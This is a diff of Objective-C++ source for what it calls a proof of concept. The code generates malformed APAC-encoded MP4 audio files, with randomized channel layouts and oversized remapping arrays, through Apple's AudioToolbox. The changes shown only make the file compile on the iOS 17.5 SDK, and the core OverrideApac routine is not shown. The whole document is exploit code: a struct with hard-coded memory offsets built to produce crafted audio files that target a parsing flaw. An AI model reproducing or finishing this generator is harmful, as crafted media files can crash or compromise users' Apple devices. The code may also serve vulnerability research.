@@ -1,15 +1,14 @@
-//clang++ -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) -framework AVFAudio -framework AudioToolbox poc_variation1.mm -o poc_variation1
-//The provided code is Variation 1, which runs five tests with randomized channel counts (1–16), mChannelLayoutTag values (1, 2, 4, 8, 16), and mRemappingArray sizes (1KB–128KB). 
-//It generates files named output_0.mp4 to output_4.mp4
-
 @import AVFAudio;
 @import AudioToolbox;
 #include <vector>
 #include <random>
 
+// Define kAudioFormatAPAC manually since it's not in the iPhoneOS 17.5 SDK
+#define kAudioFormatAPAC 'apac' // FourCC code for 'apac'
+
 struct CodecConfig {
   char padding0[0x78];
-  AudioChannelLayout* remappingChannelLayout;
+  const AudioChannelLayout* remappingChannelLayout; // Changed to const to match API
   char padding1[0xe0 - 0x80];
   std::vector<char> mRemappingArray;
 };
@@ -39,7 +38,7 @@ int main() {
     AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                              channels:channelNum];
     AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
-                                                 .mFormatID = kAudioFormatAPAC,
+                                                 .mFormatID = kAudioFormatAPAC, // Now defined
                                                  .mFormatFlags = 0,
                                                  .mBytesPerPacket = 0,
                                                  .mFramesPerPacket = 0,
@@ -51,7 +50,7 @@ int main() {
         [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | tag];
 
     CodecConfig config;
-    config.remappingChannelLayout = channelLayout.layout;
+    config.remappingChannelLayout = channelLayout.layout; // Now compatible due to const
     OverrideApac(&config, tag, arraySize);
 
     NSURL* outUrl = [NSURL fileURLWithPath:[NSString stringWithFormat:@"output_%d.mp4", i]];
